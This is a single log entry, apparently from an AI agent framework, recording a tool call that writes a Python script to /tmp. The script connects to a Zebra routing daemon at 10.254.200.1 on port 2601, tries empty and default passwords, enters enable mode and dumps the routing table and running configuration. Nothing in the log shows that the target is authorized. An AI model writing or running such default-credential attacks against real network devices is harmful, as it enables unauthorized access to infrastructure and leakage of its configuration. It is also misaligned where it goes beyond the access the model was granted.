2026-09-12 00:57:09,259 [INFO] excalibur.core.langfuse: [TOOL]: Write: {'file_path': '/tmp/zebra_query.py', 'content': '#!/usr/bin/env python3\nimport socket\nimport time\n\ndef query_zebra(host, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(10)\n        s.connect((host, port))\n\n        # Receive initial banner\n        data = s.recv(4096)\n        print(f"Banner: {data.decode(\'utf-8\', errors=\'ignore\')}")\n\n        # Try to authenticate with empty/common passwords\n        passwords = [\'\', \'zebra\', \'admin\', \'password\']\n\n        for pwd in passwords:\n            try:\n                if pwd:\n                    s.send(f"{pwd}\\n".encode())\n                    time.sleep(0.5)\n                    data = s.recv(4096)\n                    print(f"After password \'{pwd}\': {data.decode(\'utf-8\', errors=\'ignore\')}")\n\n                # Try enable mode\n                s.send(b"enable\\n")\n                time.sleep(0.5)\n                data = s.recv(4096)\n                print(f"Enable response: {data.decode(\'utf-8\', errors=\'ignore\')}")\n\n                # Show IP route\n                s.send(b"show ip route\\n")\n                time.sleep(1)\n                data = s.recv(8192)\n                print(f"Routes:\\n{data.decode(\'utf-8\', errors=\'ignore\')}")\n\n                # Show running config\n                s.send(b"show running-config\\n")\n                time.sleep(1)\n                data = s.recv(8192)\n                print(f"Config:\\n{data.decode(\'utf-8\', errors=\'ignore\')}")\n\n                break\n            except Exception as e:\n                print(f"Error with password {pwd}: {e}")\n                continue\n\n        s.close()\n    except Exception as e:\n        print(f"Connection error: {e}")\n\nif __name__ == "__main__":\n    query_zebra("10.254.200.1", 2601)\n'}; start
